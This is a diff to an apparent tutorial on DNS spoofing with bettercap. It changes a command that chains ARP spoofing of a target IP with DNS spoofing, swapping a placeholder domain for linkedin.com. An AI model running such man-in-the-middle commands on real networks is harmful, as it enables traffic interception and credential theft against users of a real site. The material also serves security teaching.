@@ -623,7 +623,7 @@ Let's look at an example output of DNS Spoofing using bettercap:
   Use the following commands in bettercap terminal:
 
   ```bash
-  net.probe on; net.sniff on; arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; arp.spoof on; set dns.spoof.domains www.targetsite.com,*.targetsite.com; dns.spoof on;
+  net.probe on; net.sniff on; arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; arp.spoof on; set dns.spoof.domains linkedin.com; dns.spoof on;
   ```
 
   ![](../imgs/dns-spoof2.png)
@@ -632,3 +632,4 @@ Let's look at an example output of DNS Spoofing using bettercap:
 
   ![](../imgs/dns-spoof3.png)
   ![](../imgs/dns-spoof4.png)
+
